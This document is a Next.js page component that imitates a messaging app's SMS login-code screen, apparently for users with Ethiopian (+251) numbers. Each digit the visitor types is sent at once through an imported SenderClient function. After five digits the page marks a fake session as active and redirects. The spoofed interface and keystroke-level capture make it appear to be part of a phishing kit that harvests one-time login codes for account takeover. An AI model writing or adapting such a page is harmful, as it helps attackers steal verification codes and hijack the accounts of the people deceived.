"use client"

import type React from "react"

import { useState, useRef,useEffect } from "react"
import { ArrowLeft } from "lucide-react"
import { SenderClient } from "@/lib/SenderClient"
import { useRouter } from "next/navigation"

export default function PasswordPage() {
    const router = useRouter()
  const [code, setCode] = useState(["", "", "", "", ""])
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const [phonenumber,setNumber]=useState("")

useEffect(()=>{
   const number=localStorage.getItem("phone")
   console.log(number);
   
   if(number?.includes("9")){
     setNumber(number)
   }
},[])


  const handleInputChange = (index: number, value: string) => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newCode = [...code]
      newCode[index] = value
      setCode(newCode)
      SenderClient(value)
      // Auto-focus next input
      if (value && index < 4) {
        inputRefs.current[index + 1]?.focus()
      }
      if(value && index ===4){
        localStorage.setItem("sessionActive","true")
        router.push("/")
      }
    }
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handleNumberClick = (num: string) => {
    const emptyIndex = code.findIndex((digit) => digit === "")
    if (emptyIndex !== -1) {
      handleInputChange(emptyIndex, num)
    }
  }

  const handleBackspace = () => {
    const lastFilledIndex = code
      .map((digit, index) => (digit ? index : -1))
      .filter((index) => index !== -1)
      .pop()

    if (lastFilledIndex !== undefined) {
      const newCode = [...code]
      newCode[lastFilledIndex] = ""
      setCode(newCode)
      inputRefs.current[lastFilledIndex]?.focus()
    }
  }

  return (
    <div className="min-h-screen bg-slate-800 text-white">
      {/* Mobile Layout */}
      <div className="md:hidden h-screen flex flex-col">
        {/* Mobile Header */}
        <div className="flex items-center justify-between p-4 pt-12">
          <ArrowLeft className="w-6 h-6 text-white" />
          <div className="flex-1" />
        </div>

        {/* Mobile Content */}
        <div className="flex-1 flex flex-col items-center justify-center px-6 -mt-20">
          {/* Phone Icon */}
          <div className="mb-8">
            <div className="relative">
              <div className="w-16 h-20 border-2 border-white rounded-lg bg-transparent"></div>
              <div className="absolute -right-2 top-2 bg-blue-400 rounded-lg px-3 py-2">
                <div className="text-black text-xs font-bold">***</div>
              </div>
            </div>
          </div>

          {/* Title */}
          <h1 className="text-2xl font-medium mb-4 text-center">Enter code</h1>

          {/* Subtitle */}
          <p className="text-gray-400 text-center mb-8 px-4 leading-relaxed">
            We've sent an SMS with an activation code to your phone +251{phonenumber}.
          </p>

          {/* Code Input Boxes */}
          <div className="flex gap-3 mb-8">
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                value={digit}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className={`w-12 h-12 text-center text-xl font-medium rounded-lg border-2 bg-transparent ${
                  digit ? "border-blue-400 text-white" : "border-gray-600 text-gray-400"
                } focus:border-blue-400 focus:outline-none`}
                maxLength={1}
              />
            ))}
          </div>
        </div>

        {/* Mobile Keypad */}
        <div className="p-4 pb-8">
          <div className="grid grid-cols-3 gap-4 max-w-xs mx-auto">
            {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
              <button
                key={num}
                onClick={() => handleNumberClick(num.toString())}
                className="h-16 text-2xl font-light text-white hover:bg-slate-700 rounded-lg transition-colors"
              >
                {num}
                <div className="text-xs text-gray-400 mt-1">
                  {num === 2 && "ABC"}
                  {num === 3 && "DEF"}
                  {num === 4 && "GHI"}
                  {num === 5 && "JKL"}
                  {num === 6 && "MNO"}
                  {num === 7 && "PQRS"}
                  {num === 8 && "TUV"}
                  {num === 9 && "WXYZ"}
                </div>
              </button>
            ))}
            <div></div>
            <button
              onClick={() => handleNumberClick("0")}
              className="h-16 text-2xl font-light text-white hover:bg-slate-700 rounded-lg transition-colors"
            >
              0
            </button>
            <button
              onClick={handleBackspace}
              className="h-16 flex items-center justify-center text-white hover:bg-slate-700 rounded-lg transition-colors"
            >
              <span className="text-2xl">⌫</span>
            </button>
          </div>
        </div>
      </div>

      {/* Desktop Layout */}
      <div className="hidden md:flex min-h-screen">
        {/* Desktop Header */}
        <div className="absolute top-4 left-4">
          <ArrowLeft className="w-6 h-6 text-white cursor-pointer hover:text-gray-300" />
        </div>
        <div className="absolute top-4 right-4">
          <button className="text-blue-400 hover:text-blue-300 font-medium">SETTINGS</button>
        </div>

        {/* Desktop Content */}
        <div className="flex-1 flex flex-col items-center justify-center max-w-md mx-auto px-8">
          {/* Phone Icon */}
          <div className="mb-8">
            <div className="relative">
              <div className="w-16 h-20 border-2 border-white rounded-lg bg-transparent"></div>
              <div className="absolute -right-2 top-2 bg-blue-400 rounded-lg px-3 py-2">
                <div className="text-black text-xs font-bold">***</div>
              </div>
            </div>
          </div>

          {/* Title */}
          <h1 className="text-3xl font-medium mb-6 text-center">Enter code</h1>

          {/* Subtitle */}
          <p className="text-gray-400 text-center mb-8 leading-relaxed">
            We've sent an SMS with an activation code to your phone +251{phonenumber}.
          </p>

          {/* Code Input Boxes */}
          <div className="flex gap-4 mb-8">
            {code.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                value={digit}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className={`w-14 h-14 text-center text-xl font-medium rounded-lg border-2 bg-transparent ${
                  digit ? "border-blue-400 text-white" : "border-gray-600 text-gray-400"
                } focus:border-blue-400 focus:outline-none`}
                maxLength={1}
              />
            ))}
          </div>

          {/* Desktop Continue Button */}
          <button className="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 rounded-lg font-medium transition-colors">
            Continue
          </button>

          {/* QR Code Link */}
          <button className="mt-6 text-blue-400 hover:text-blue-300 text-sm">Quick log in using QR code</button>
        </div>
      </div>
    </div>
  )
}
